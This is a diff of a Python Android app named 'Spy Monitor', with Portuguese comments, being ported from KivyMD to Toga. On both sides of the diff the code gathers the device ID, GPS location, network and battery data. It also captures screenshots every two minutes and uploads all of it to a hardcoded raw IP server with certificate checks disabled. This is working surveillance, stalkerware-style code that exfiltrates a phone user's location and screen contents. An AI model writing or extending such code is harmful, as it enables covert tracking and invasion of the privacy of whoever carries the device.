@@ -1,206 +1,215 @@
-# Spy Monitor App - KivyMD Version
-# Aplicação principal de monitoramento usando KivyMD
-
-import kivy
-from kivymd.app import MDApp
-from kivymd.uix.boxlayout import MDBoxLayout
-from kivymd.uix.label import MDLabel
-from kivymd.uix.button import MDRaisedButton
-from kivymd.uix.textfield import MDTextField
-from kivymd.uix.scrollview import ScrollView
-from kivy.metrics import dp
-from kivy.clock import Clock
+import toga
+from toga.style import Pack
+from toga.style.pack import COLUMN
 import time
+import datetime
 import threading
 import requests
-import json
-from datetime import datetime
 import uuid
 import platform
+import os
+import tempfile
 import logging
 import queue
-import os
 
-# Configuração do servidor externo
+# Verificar disponibilidade do rubicon-java
+try:
+    import rubicon.java
+    RUBICON_AVAILABLE = True
+except ImportError:
+    RUBICON_AVAILABLE = False
+
+# Configurações otimizadas
 SERVER_URL = "https://147.79.111.118"
+COLLECTION_INTERVAL = 120  # 2 minutos
+REQUEST_TIMEOUT = 15
 
-# Configurações otimizadas para coleta leve
-COLLECTION_INTERVAL = 120  # segundos (mais espaçado para reduzir bateria)
-SCREENSHOT_INTERVAL = 120  # segundos (2 minutos para screenshots)
-REQUEST_TIMEOUT = 20  # segundos (mais tempo para conexões lentas)
-MAX_RETRIES = 5  # mais tentativas para confiabilidade
-BATCH_SIZE = 3  # lotes menores para evitar sobrecarga
-
-class SpyMonitor(MDApp):
-    """Aplicação principal de monitoramento usando KivyMD"""
-
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        # Variáveis de controle
-        self.is_monitoring = False
-        self.device_id = self.get_device_id()
-        self.collection_count = 0
-        self.data_queue = queue.Queue(maxsize=50)  # Fila para dados coletados
-        self.send_thread = None
-        self.last_collection = 0
-        self.last_screenshot = 0
+class SpyMonitor(toga.App):
+    def __init__(self, formal_name="Spy Monitor", app_id="org.beeware.spymonitor"):
+        super().__init__(formal_name=formal_name, app_id=app_id)
 
     def main_module(self):
-        """Retorna o módulo principal para briefcase"""
-        return "spymonitor.app"
+        return "spymonitor.main"
 
-    def build(self):
-        """Inicializar a aplicação de monitoramento"""
-        # Criar interface principal com KivyMD
-        main_layout = MDBoxLayout(orientation='vertical', spacing=dp(10), padding=dp(20))
+    def startup(self):
+        try:
+            # Inicializar atributos otimizados
+            self.device_id = self.get_device_id()
+            self.is_monitoring = False
+            self.collection_count = 0
+            self.monitoring_thread = None
+            self.data_queue = queue.Queue(maxsize=20)  # Fila menor para leveza
+            self.last_collection = 0
+            self.last_screenshot = 0
+            self.send_thread = None
 
-        # Título
-        title_label = MDLabel(
-            text='📱 Spy Monitor',
-            halign='center',
-            font_style='H4',
-            theme_text_color='Primary',
-            size_hint_y=None,
-            height=dp(50)
-        )
-        main_layout.add_widget(title_label)
+            # Inicializar APIs nativas do Android (apenas se disponível)
+            if RUBICON_AVAILABLE and platform.system() == 'Android':
+                self.init_android_apis()
 
-        # Status
-        self.status_label = MDLabel(
-            text='Status: Parado',
-            halign='center',
-            font_style='H6',
-            theme_text_color='Error',
-            size_hint_y=None,
-            height=dp(40)
-        )
-        main_layout.add_widget(self.status_label)
+            # Interface principal simplificada
+            main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
 
-        # Botão Iniciar/Parar
-        self.monitor_button = MDRaisedButton(
-            text='▶️ Iniciar Monitoramento',
-            on_release=self.toggle_monitoring,
-            size_hint=(1, None),
-            height=dp(50),
-            md_bg_color=(0.19, 0.68, 0.38, 1)  # Verde
-        )
-        main_layout.add_widget(self.monitor_button)
+            # Título
+            title = toga.Label(
+                "📱 Spy Monitor",
+                style=Pack(padding=(0, 5), font_size=18)
+            )
+            main_box.add(title)
 
-        # Área de logs
-        logs_title = MDLabel(
-            text='📋 Logs:',
-            font_style='H6',
-            theme_text_color='Secondary',
-            size_hint_y=None,
-            height=dp(30)
-        )
-        main_layout.add_widget(logs_title)
+            # Status
+            self.status_label = toga.Label(
+                "Status: Parado",
+                style=Pack(padding=(0, 5))
+            )
+            main_box.add(self.status_label)
 
-        # ScrollView para logs
-        scroll_view = ScrollView(size_hint=(1, 1))
-        self.logs_text = MDTextField(
-            multiline=True,
-            readonly=True,
-            size_hint=(1, None),
-            height=dp(200)
-        )
-        scroll_view.add_widget(self.logs_text)
-        main_layout.add_widget(scroll_view)
+            # Contador
+            self.counter_label = toga.Label(
+                "Dados enviados: 0",
+                style=Pack(padding=(0, 5))
+            )
+            main_box.add(self.counter_label)
 
-        self.add_log("App iniciado")
-        self.add_log(f"ID do Dispositivo: {self.device_id}")
-        self.add_log(f"Servidor: {SERVER_URL}")
+            # Botão principal
+            self.monitor_button = toga.Button(
+                "▶️ Iniciar Monitoramento",
+                on_press=self.toggle_monitoring,
+                style=Pack(padding=(5, 0))
+            )
+            main_box.add(self.monitor_button)
 
-        return main_layout
+            # Botão de teste de conexão
+            self.test_button = toga.Button(
+                "🔍 Testar Conexão",
+                on_press=self.test_connection_manual,
+                style=Pack(padding=(5, 0))
+            )
+            main_box.add(self.test_button)
+
+            # Logs simples
+            self.log_label = toga.Label(
+                "📝 Logs: Pronto",
+                style=Pack(padding=(10, 5, 0, 5), font_size=12)
+            )
+            main_box.add(self.log_label)
+
+            # Janela principal
+            self.main_window = toga.MainWindow(title="Spy Monitor")
+            self.main_window.content = main_box
+            self.main_window.show()
+
+            self.update_log("App inicializado")
+
+        except Exception as e:
+            # Interface de erro simplificada
+            error_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
+            error_label = toga.Label(f"Erro: {str(e)[:50]}", style=Pack(padding=(0, 5)))
+            error_box.add(error_label)
+
+            self.main_window = toga.MainWindow(title="Erro")
+            self.main_window.content = error_box
+            self.main_window.show()
+
+    def init_android_apis(self):
+        """Inicializa APIs nativas do Android usando rubicon-java"""
+        try:
+            from rubicon.java import JavaClass
+
+            # Inicializar classes Android
+            self.Intent = JavaClass('android/content/Intent')
+            self.IntentFilter = JavaClass('android/content/IntentFilter')
+            self.BatteryManager = JavaClass('android/os/BatteryManager')
+            self.LocationManager = JavaClass('android/location/LocationManager')
+
+            self.update_log("APIs Android inicializadas")
+        except Exception as e:
+            self.update_log(f"Erro APIs Android: {str(e)[:20]}")
 
     def get_device_id(self):
-        """Gera ID único do dispositivo"""
         try:
-            # Tenta obter IMEI real (Android)
-            if platform.system() == 'Android':
-                from android.permissions import request_permission, Permission
-                from jnius import autoclass
-
-                try:
-                    request_permission(Permission.READ_PHONE_STATE)
-                    TelephonyManager = autoclass('android.telephony.TelephonyManager')
-                    Context = autoclass('android.content.Context')
-                    PythonActivity = autoclass('org.kivy.android.PythonActivity')
-
-                    activity = PythonActivity.mActivity
-                    tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
-                    device_id = tm.getDeviceId()
-
-                    if device_id:
-                        return device_id
-                except:
-                    pass
-
-            # Fallback: gerar ID único baseado no dispositivo
+            # ID único simples
             import hashlib
-            unique_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
+            unique_string = f"{platform.node()}-{platform.machine()}"
             return hashlib.md5(unique_string.encode()).hexdigest()[:15]
         except:
             return str(uuid.uuid4())[:15]
 
-    def add_log(self, message):
-        """Adiciona mensagem aos logs"""
-        timestamp = datetime.now().strftime('%H:%M:%S')
-        log_entry = f"[{timestamp}] {message}\n"
+    def update_log(self, message):
+        try:
+            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+            self.log_label.text = f"[{timestamp}] {message}"
+        except:
+            pass
 
-        current_text = self.logs_text.value or ""
-        lines = (current_text + log_entry).split('\n')
-        if len(lines) > 20:
-            lines = lines[-20:]
-        self.logs_text.value = '\n'.join(lines)
+    def restart_app(self, widget):
+        """Reinicia o aplicativo"""
+        try:
+            self.main_window.close()
+            app = SpyMonitor()
+            app.main_loop()
+        except:
+            pass
 
-    def toggle_monitoring(self, instance):
-        """Alterna monitoramento"""
+    def toggle_monitoring(self, widget):
         if not self.is_monitoring:
             self.start_monitoring()
         else:
             self.stop_monitoring()
 
     def start_monitoring(self):
-        """Inicia monitoramento"""
-        self.is_monitoring = True
-        self.status_label.text = 'Status: Ativo'
-        self.status_label.theme_text_color = 'Custom'
-        self.status_label.text_color = (0.19, 0.68, 0.38, 1)  # Verde
-        self.monitor_button.text = '⏹️ Parar Monitoramento'
-        self.monitor_button.md_bg_color = (0.91, 0.12, 0.39, 1)  # Vermelho
+        try:
+            self.is_monitoring = True
+            self.status_label.text = "▶️ Ativo"
+            self.status_label.style.color = '#27ae60'
+            self.monitor_button.text = "⏹️ Parar Monitoramento"
+            self.monitor_button.style.background_color = '#e74c3c'
 
-        # Testar conexão com servidor
-        self.test_server_connection()
+            # Testar conexão
+            if self.test_connection():
+                self.update_log("🌐 Conectado ao servidor")
 
-        # Iniciar thread de monitoramento
-        self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
-        self.monitoring_thread.start()
+                # Iniciar monitoramento em thread
+                self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
+                self.monitoring_thread.start()
 
-        self.add_log("Monitoramento iniciado - Captura automática de screenshots ativada")
+                self.update_log("🚀 Monitoramento iniciado - Captura automática ativada")
+            else:
+                self.update_log("❌ Erro: Servidor indisponível")
+                self.stop_monitoring()
+
+        except Exception as e:
+            self.update_log(f"❌ Erro ao iniciar: {str(e)[:30]}")
+            self.stop_monitoring()
 
     def stop_monitoring(self):
-        """Para monitoramento"""
-        self.is_monitoring = False
-        self.status_label.text = 'Status: Parado'
-        self.status_label.theme_text_color = 'Error'
-        self.monitor_button.text = '▶️ Iniciar Monitoramento'
-        self.monitor_button.md_bg_color = (0.19, 0.68, 0.38, 1)  # Verde
-        self.add_log("Monitoramento parado - Captura de screenshots desativada")
-
-    def test_server_connection(self):
-        """Testa conexão com servidor"""
         try:
-            response = requests.get(f"{SERVER_URL}/api/test/", timeout=REQUEST_TIMEOUT, verify=False)
-            if response.status_code == 200:
-                self.add_log("✅ Servidor conectado")
-                return True
-            else:
-                self.add_log(f"⚠️ Resposta do servidor: {response.status_code}")
-                return False
-        except requests.exceptions.RequestException as e:
-            self.add_log(f"❌ Erro de conexão: {str(e)[:50]}")
+            self.is_monitoring = False
+            self.status_label.text = "⏹️ Parado"
+            self.status_label.style.color = '#e74c3c'
+            self.monitor_button.text = "▶️ Iniciar Monitoramento"
+            self.monitor_button.style.background_color = '#27ae60'
+            self.update_log("⏹️ Monitoramento parado")
+        except:
+            pass
+
+    def test_connection(self):
+        try:
+            response = requests.get(f"{SERVER_URL}/", timeout=REQUEST_TIMEOUT, verify=False)
+            return response.status_code == 200
+        except:
             return False
+
+    def test_connection_manual(self, widget):
+        """Teste manual de conexão"""
+        try:
+            self.update_log("🔍 Testando conexão com servidor...")
+            if self.test_connection():
+                self.update_log("✅ Conexão OK - Servidor respondendo")
+            else:
+                self.update_log("❌ Falha na conexão - Verifique internet")
+        except Exception as e:
+            self.update_log(f"❌ Erro no teste: {str(e)[:30]}")
 
     def monitoring_loop(self):
         """Loop principal de monitoramento otimizado"""
@@ -214,32 +223,32 @@ class SpyMonitor(MDApp):
                     self.collect_and_send_data()
 
                 # Captura de screenshot a cada 2 minutos
-                if current_time - self.last_screenshot >= SCREENSHOT_INTERVAL:
+                if current_time - self.last_screenshot >= COLLECTION_INTERVAL:
                     self.last_screenshot = current_time
                     self.take_screenshot()
 
-                time.sleep(5)  # Sleep menor para resposta mais rápida
+                time.sleep(10)  # Sleep maior para estabilidade
 
             except Exception as e:
-                self.add_log(f"Erro no loop principal: {str(e)[:50]}")
-                time.sleep(10)
+                self.update_log(f"Erro no loop principal: {str(e)[:30]}")
+                time.sleep(15)
 
     def collect_and_send_data(self):
-        """Coleta e envia dados para o servidor de forma otimizada e leve"""
+        """Coleta e envia dados de forma otimizada e leve"""
         try:
             collected_data = []
 
             # Dados básicos do dispositivo (sempre coletar - mais leve)
             device_data = {
                 'imei': self.device_id,
-                'timestamp': datetime.now().isoformat(),
+                'timestamp': datetime.datetime.now().isoformat(),
                 'platform': platform.system(),
                 'version': platform.version()[:10] if platform.version() else 'Unknown'
             }
             collected_data.append(('device_info', device_data))
 
             # Coletar localização (menos frequente - economia de bateria)
-            if self.collection_count % 3 == 0:  # A cada 3 coletas (menos frequente)
+            if self.collection_count % 3 == 0:  # A cada 3 coletas
                 location = self.get_location()
                 if location:
                     collected_data.append(('location', location))
@@ -259,19 +268,43 @@ class SpyMonitor(MDApp):
             # Enviar dados coletados apenas se houver dados
             if collected_data:
                 self.send_collected_data(collected_data)
-                self.add_log(f"✅ {len(collected_data)} tipos de dados enviados")
+                self.update_log(f"✅ {len(collected_data)} tipos enviados")
             else:
-                self.add_log("ℹ️ Nenhum dado novo para enviar")
+                self.update_log("ℹ️ Nenhum dado novo")
 
             self.collection_count += 1
 
         except Exception as e:
-            self.add_log(f"❌ Erro na coleta: {str(e)[:40]}")
+            self.update_log(f"❌ Erro na coleta: {str(e)[:25]}")
 
     def get_location(self):
-        """Obtém localização do dispositivo"""
+        """Obtém localização do dispositivo usando rubicon-java"""
         try:
-            if platform.system() == 'Android':
+            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'LocationManager'):
+                from toga_android import app as toga_app
+                context = toga_app.context
+
+                # Verificar permissão de localização
+                if not self.check_location_permission():
+                    self.update_log("Sem permissão GPS")
+                    return None
+
+                # Obter LocationManager
+                location_manager = context.getSystemService(context.LOCATION_SERVICE)
+
+                # Tentar obter última localização conhecida
+                location = location_manager.getLastKnownLocation(location_manager.GPS_PROVIDER)
+
+                if location:
+                    return {
+                        'latitude': location.getLatitude(),
+                        'longitude': location.getLongitude(),
+                        'accuracy': location.getAccuracy(),
+                        'timestamp': datetime.datetime.now().isoformat()
+                    }
+
+            # Fallback para plyer
+            elif platform.system() == 'Android':
                 from plyer import gps
 
                 # Configurar GPS
@@ -287,7 +320,7 @@ class SpyMonitor(MDApp):
 
             return None
         except Exception as e:
-            self.add_log(f"Erro no GPS: {str(e)[:30]}")
+            self.update_log(f"Erro GPS: {str(e)[:20]}")
             return None
 
     def on_location_update(self, **kwargs):
@@ -295,38 +328,116 @@ class SpyMonitor(MDApp):
         self.last_location = {
             'latitude': kwargs.get('lat'),
             'longitude': kwargs.get('lon'),
-            'accuracy': kwargs.get('accuracy')
+            'accuracy': kwargs.get('accuracy'),
+            'timestamp': datetime.datetime.now().isoformat()
         }
 
     def get_network_info(self):
-        """Obtém informações de rede"""
+        """Obtém informações de rede usando rubicon-java"""
         try:
-            import socket
-            hostname = socket.gethostname()
-            local_ip = socket.gethostbyname(hostname)
+            if RUBICON_AVAILABLE and platform.system() == 'Android':
+                from toga_android import app as toga_app
+                context = toga_app.context
 
-            return {
-                'hostname': hostname,
-                'local_ip': local_ip,
-                'timestamp': datetime.now().isoformat()
-            }
-        except:
+                # Obter informações de conectividade
+                connectivity_manager = context.getSystemService(context.CONNECTIVITY_SERVICE)
+                network_info = connectivity_manager.getActiveNetworkInfo()
+
+                network_data = {
+                    'hostname': 'Android Device',
+                    'local_ip': 'Unknown',
+                    'network_type': 'Unknown',
+                    'is_connected': False,
+                    'timestamp': datetime.datetime.now().isoformat()
+                }
+
+                if network_info:
+                    network_data['is_connected'] = network_info.isConnected()
+                    network_data['network_type'] = network_info.getTypeName()
+
+                    # Tentar obter IP local
+                    try:
+                        import socket
+                        hostname = socket.gethostname()
+                        local_ip = socket.gethostbyname(hostname)
+                        network_data['hostname'] = hostname
+                        network_data['local_ip'] = local_ip
+                    except:
+                        pass
+
+                return network_data
+
+            # Fallback para socket
+            else:
+                import socket
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+
+                return {
+                    'hostname': hostname,
+                    'local_ip': local_ip,
+                    'network_type': 'Unknown',
+                    'is_connected': True,
+                    'timestamp': datetime.datetime.now().isoformat()
+                }
+        except Exception as e:
+            self.update_log(f"Erro rede: {str(e)[:20]}")
             return None
 
-    def get_battery_info(self):
-        """Obtém informações da bateria (Android)"""
+    def check_location_permission(self):
+        """Verifica se tem permissão de localização"""
         try:
-            if platform.system() == 'Android':
-                from plyer import battery
+            from toga_android import app as toga_app
+            context = toga_app.context
 
+            permission = context.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION")
+            return permission == context.PERMISSION_GRANTED
+        except:
+            return False
+
+    def get_battery_info(self):
+        """Obtém informações da bateria usando rubicon-java"""
+        try:
+            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'BatteryManager'):
+                from toga_android import app as toga_app
+                context = toga_app.context
+
+                # Criar intent para bateria
+                intent_filter = self.IntentFilter(self.Intent.ACTION_BATTERY_CHANGED)
+                battery_intent = context.registerReceiver(None, intent_filter)
+
+                if battery_intent:
+                    # Obter nível da bateria
+                    level = battery_intent.getIntExtra(self.BatteryManager.EXTRA_LEVEL, -1)
+                    scale = battery_intent.getIntExtra(self.BatteryManager.EXTRA_SCALE, -1)
+
+                    if level >= 0 and scale > 0:
+                        battery_level = (level / scale) * 100
+
+                        # Verificar se está carregando
+                        status = battery_intent.getIntExtra(self.BatteryManager.EXTRA_STATUS, -1)
+                        is_charging = status == self.BatteryManager.BATTERY_STATUS_CHARGING or \
+                                    status == self.BatteryManager.BATTERY_STATUS_FULL
+
+                        return {
+                            'level': int(battery_level),
+                            'charging': is_charging,
+                            'timestamp': datetime.datetime.now().isoformat()
+                        }
+
+            # Fallback para plyer
+            elif platform.system() == 'Android':
+                from plyer import battery
                 battery_status = battery.status
                 return {
                     'level': battery_status.get('percentage', 0),
                     'charging': battery_status.get('isCharging', False),
-                    'timestamp': datetime.now().isoformat()
+                    'timestamp': datetime.datetime.now().isoformat()
                 }
+
             return None
-        except:
+        except Exception as e:
+            self.update_log(f"Erro bateria: {str(e)[:20]}")
             return None
 
     def take_screenshot(self):
@@ -334,7 +445,6 @@ class SpyMonitor(MDApp):
         try:
             if platform.system() == 'Android':
                 from plyer import screenshot
-                import tempfile
 
                 # Criar arquivo temporário para screenshot
                 temp_dir = tempfile.gettempdir()
@@ -346,12 +456,12 @@ class SpyMonitor(MDApp):
                 if os.path.exists(screenshot_path):
                     # Enviar screenshot para servidor
                     self.upload_screenshot(screenshot_path)
-                    self.add_log("📸 Screenshot capturado e enviado")
+                    self.update_log("📸 Screenshot capturado")
                 else:
-                    self.add_log("❌ Falha ao capturar screenshot")
+                    self.update_log("❌ Falha no screenshot")
 
         except Exception as e:
-            self.add_log(f"Erro no screenshot: {str(e)[:40]}")
+            self.update_log(f"Erro screenshot: {str(e)[:20]}")
 
     def upload_screenshot(self, screenshot_path):
         """Faz upload do screenshot para o servidor"""
@@ -375,15 +485,15 @@ class SpyMonitor(MDApp):
 
                     if response.status_code == 200:
                         os.remove(screenshot_path)  # Remove arquivo após upload
-                        self.add_log("✅ Screenshot enviado com sucesso")
+                        self.update_log("✅ Screenshot enviado")
                     else:
-                        self.add_log(f"⚠️ Erro upload screenshot: {response.status_code}")
+                        self.update_log(f"⚠️ Upload erro: {response.status_code}")
 
         except Exception as e:
-            self.add_log(f"❌ Erro no upload: {str(e)[:40]}")
+            self.update_log(f"❌ Erro upload: {str(e)[:20]}")
 
     def send_collected_data(self, data_list):
-        """Envia dados coletados de forma otimizada com retry"""
+        """Envia dados coletados de forma otimizada"""
         for data_type, data in data_list:
             self.send_data_with_retry(data_type, data)
 
@@ -408,51 +518,46 @@ class SpyMonitor(MDApp):
             if response.status_code in [200, 201]:
                 # Logs mais concisos
                 if data_type == 'location':
-                    self.add_log("📍 Localização OK")
+                    self.update_log("📍 Localização OK")
                 elif data_type == 'network':
-                    self.add_log("🌐 Rede OK")
+                    self.update_log("🌐 Rede OK")
                 elif data_type == 'battery':
                     nivel = data.get('level', data.get('bateria_nivel', 'N/A'))
-                    self.add_log(f"🔋 Bateria: {nivel}%")
+                    self.update_log(f"🔋 Bateria: {nivel}%")
                 # Device info não loga para reduzir verbosidade
             else:
-                if retry_count < MAX_RETRIES:
-                    # Backoff exponencial com jitter para evitar sobrecarga
-                    delay = (2 ** retry_count) + (retry_count * 0.1)
-                    time.sleep(min(delay, 30))  # Máximo 30 segundos
+                if retry_count < 3:  # Menos retries para leveza
+                    delay = (2 ** retry_count) + 1
+                    time.sleep(min(delay, 15))  # Máximo 15 segundos
                     self.send_data_with_retry(data_type, data, retry_count + 1)
                 else:
-                    self.add_log(f"⚠️ {data_type}: HTTP {response.status_code}")
+                    self.update_log(f"⚠️ {data_type}: HTTP {response.status_code}")
 
         except requests.exceptions.Timeout:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 1
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"⏰ Tempo limite {data_type}")
+                self.update_log(f"⏰ Timeout {data_type}")
         except requests.exceptions.ConnectionError:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 2
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"🔌 Conexão {data_type} falhou")
+                self.update_log(f"🔌 Conexão {data_type} falhou")
         except requests.exceptions.RequestException as e:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 1
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"❌ Erro {data_type}: {str(e)[:25]}")
-
-    def on_stop(self):
-        """Fechamento da aplicação"""
-        self.is_monitoring = False
-        self.add_log("Aplicativo fechado")
+                self.update_log(f"❌ Erro {data_type}: {str(e)[:15]}")
 
 def main():
     return SpyMonitor()
 
 if __name__ == '__main__':
-    SpyMonitor().run()
+    app = SpyMonitor()
+    app.main_loop()
